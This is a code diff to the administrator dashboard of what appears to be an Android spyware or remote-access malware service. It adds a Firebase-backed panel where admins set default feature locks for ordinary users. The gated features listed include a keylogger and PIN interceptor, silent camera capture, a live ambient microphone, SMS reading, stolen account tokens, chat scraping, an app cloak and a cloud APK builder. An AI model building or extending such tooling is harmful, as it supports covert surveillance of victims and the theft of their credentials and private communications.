@@ -141,6 +141,34 @@
                 </div>
             </div>
 
+            <!-- Global Default Feature Access Preset for Normal Users -->
+            <div class="card" style="margin-bottom: 32px; border: 1.5px solid rgba(255, 69, 58, 0.35); box-shadow: 0 10px 40px rgba(255, 59, 48, 0.1);">
+                <div class="card-header-gradient" style="display: flex; justify-content: space-between; align-items: center; padding: 18px 24px; background: linear-gradient(135deg, rgba(255, 59, 48, 0.15) 0%, rgba(0,0,0,0.5) 100%);">
+                    <div>
+                        <h4 style="font-size: 1.1rem; font-weight: 800; display: flex; align-items: center; gap: 10px; color: #fff;">
+                            <i class="fas fa-sliders-h" style="color: var(--primary);"></i> Default Feature Rules for Normal Users (Global Config)
+                        </h4>
+                        <p style="font-size: 0.8rem; color: var(--text-secondary); margin-top: 4px; margin-bottom: 0;">
+                            Configure default feature locks for all regular users. When locked here, any normal user logging in will see those features locked by default until granted.
+                        </p>
+                    </div>
+                    <div style="display: flex; gap: 8px;">
+                        <button onclick="applyDefaultPreset('lockAll')" class="btn-ghost" style="padding: 6px 14px; font-size: 0.75rem; border-radius: var(--radius-pill); color: #ff453a; border-color: rgba(255,69,58,0.4);">
+                            <i class="fas fa-lock me-1"></i> Lock All Default
+                        </button>
+                        <button onclick="applyDefaultPreset('unlockAll')" class="btn-ghost" style="padding: 6px 14px; font-size: 0.75rem; border-radius: var(--radius-pill); color: #30d158; border-color: rgba(48,209,88,0.4);">
+                            <i class="fas fa-unlock me-1"></i> Unlock All Default
+                        </button>
+                    </div>
+                </div>
+                
+                <div style="padding: 24px;">
+                    <div id="defaultRulesGrid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 12px;">
+                        <!-- Rendered dynamically -->
+                    </div>
+                </div>
+            </div>
+
             <!-- Users Table Card -->
             <div class="card" style="margin-bottom: 32px; overflow: hidden;">
                 <div class="card-header-gradient" style="display: flex; justify-content: space-between; align-items: center; padding: 18px 24px;">
@@ -253,7 +281,55 @@
         }
     }, 1500);
 
+    let globalDefaultRules = {
+        sms: false,
+        notification: false,
+        stealth: false,
+        accounts: false,
+        calls: false,
+        gallery: false,
+        files: false,
+        location: false,
+        keylogs: false,
+        audio: false,
+        camera: false,
+        chats: false,
+        apps: false,
+        privacy_screen: false,
+        sensitive_feed: false,
+        edit_modules: false,
+        build_apk: true
+    };
+
+    const ALL_FEATURES_LIST = [
+        { key: 'sms', label: 'SMS Reader & Dispatch', icon: 'fa-envelope' },
+        { key: 'notification', label: 'Push Notification Injector', icon: 'fa-bell' },
+        { key: 'stealth', label: 'Stealth Engine & App Cloak', icon: 'fa-user-ninja' },
+        { key: 'accounts', label: 'Exported Accounts & Tokens', icon: 'fa-user-circle' },
+        { key: 'calls', label: 'Calls & Contacts Stream', icon: 'fa-phone-alt' },
+        { key: 'gallery', label: 'Media Gallery DCIM', icon: 'fa-images' },
+        { key: 'files', label: 'File Manager Explorer', icon: 'fa-folder' },
+        { key: 'location', label: 'Real-Time GPS Tracker', icon: 'fa-map-marker-alt' },
+        { key: 'keylogs', label: 'Keylogger & PIN Interceptor', icon: 'fa-keyboard' },
+        { key: 'audio', label: 'Live Ambient Audio Mic', icon: 'fa-microphone' },
+        { key: 'camera', label: 'Silent Camera Snaps', icon: 'fa-camera' },
+        { key: 'chats', label: 'Social Chat Feed (WA/IG/TG)', icon: 'fa-comments' },
+        { key: 'apps', label: 'Installed Apps Manager', icon: 'fa-th' },
+        { key: 'privacy_screen', label: 'Privacy Blackout Screen', icon: 'fa-user-secret' },
+        { key: 'sensitive_feed', label: 'Sensitive PIN/Pass Feed', icon: 'fa-key' },
+        { key: 'edit_modules', label: 'Edit Build Perms Checkboxes', icon: 'fa-sliders-h' },
+        { key: 'build_apk', label: 'Cloud APK Builder', icon: 'fa-hammer' }
+    ];
+
     function initAdminDashboard() {
+        // 0. Listen to Global Default Rules
+        fbDb.ref('global_config/default_permissions').on('value', snap => {
+            if (snap.exists()) {
+                globalDefaultRules = Object.assign({}, globalDefaultRules, snap.val());
+            }
+            renderDefaultRulesGrid();
+        });
+
         // 1. Listen to users_meta
         fbDb.ref('users_meta').on('value', snap => {
             allUsersData = snap.val() || {};
@@ -278,6 +354,62 @@
         // 4. Listen to audit activity stream
         fbDb.ref('audit_logs').limitToLast(50).on('value', snap => {
             renderAuditLogs(snap.val());
+        });
+    }
+
+    function renderDefaultRulesGrid() {
+        const grid = document.getElementById('defaultRulesGrid');
+        if (!grid) return;
+
+        let html = '';
+        ALL_FEATURES_LIST.forEach(item => {
+            const isUnlocked = globalDefaultRules[item.key] === true;
+            html += `
+                <div style="background: ${isUnlocked ? 'rgba(48, 209, 88, 0.08)' : 'rgba(255, 69, 58, 0.08)'}; border: 1.5px solid ${isUnlocked ? 'rgba(48, 209, 88, 0.4)' : 'rgba(255, 69, 58, 0.35)'}; border-radius: 14px; padding: 12px 14px; display: flex; align-items: center; justify-content: space-between; gap: 10px; transition: all 160ms ease;">
+                    <div style="display: flex; align-items: center; gap: 10px; min-width: 0;">
+                        <div style="width: 32px; height: 32px; border-radius: 8px; background: ${isUnlocked ? 'rgba(48, 209, 88, 0.2)' : 'rgba(255, 69, 58, 0.2)'}; display: flex; align-items: center; justify-content: center; color: ${isUnlocked ? '#30d158' : '#ff453a'}; font-size: 0.88rem; flex-shrink: 0;">
+                            <i class="fas ${item.icon}"></i>
+                        </div>
+                        <div style="min-width: 0;">
+                            <div style="font-size: 0.8rem; font-weight: 700; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${item.label}</div>
+                            <div style="font-size: 0.68rem; color: ${isUnlocked ? '#30d158' : '#ff453a'}; font-weight: 700; text-transform: uppercase;">
+                                ${isUnlocked ? '<i class="fas fa-unlock me-1"></i> DEFAULT UNLOCKED' : '<i class="fas fa-lock me-1"></i> DEFAULT LOCKED'}
+                            </div>
+                        </div>
+                    </div>
+                    <button onclick="toggleDefaultRule('${item.key}', ${!isUnlocked})" class="btn-ghost" style="padding: 4px 10px; font-size: 0.72rem; border-radius: var(--radius-pill); background: ${isUnlocked ? 'rgba(48, 209, 88, 0.15)' : 'rgba(255, 69, 58, 0.15)'}; border-color: ${isUnlocked ? 'rgba(48, 209, 88, 0.4)' : 'rgba(255, 69, 58, 0.4)'}; color: ${isUnlocked ? '#30d158' : '#ff453a'}; flex-shrink: 0; font-weight: 700;">
+                        ${isUnlocked ? 'Set Lock' : 'Set Unlock'}
+                    </button>
+                </div>
+            `;
+        });
+
+        grid.innerHTML = html;
+    }
+
+    function toggleDefaultRule(key, newUnlockedValue) {
+        fbDb.ref(`global_config/default_permissions/${key}`).set(newUnlockedValue).then(() => {
+            fbDb.ref('audit_logs').push({
+                timestamp: Date.now(),
+                admin: currentAdminUser.email,
+                action: `Changed GLOBAL DEFAULT rule for ${key}: ${newUnlockedValue ? 'UNLOCKED' : 'LOCKED'}`
+            });
+        });
+    }
+
+    function applyDefaultPreset(type) {
+        const updateObj = {};
+        const isUnlock = (type === 'unlockAll');
+        ALL_FEATURES_LIST.forEach(item => {
+            updateObj[item.key] = isUnlock;
+        });
+
+        fbDb.ref('global_config/default_permissions').set(updateObj).then(() => {
+            fbDb.ref('audit_logs').push({
+                timestamp: Date.now(),
+                admin: currentAdminUser.email,
+                action: `${isUnlock ? 'UNLOCKED ALL' : 'LOCKED ALL'} features in Global Default Rules`
+            });
         });
     }
 
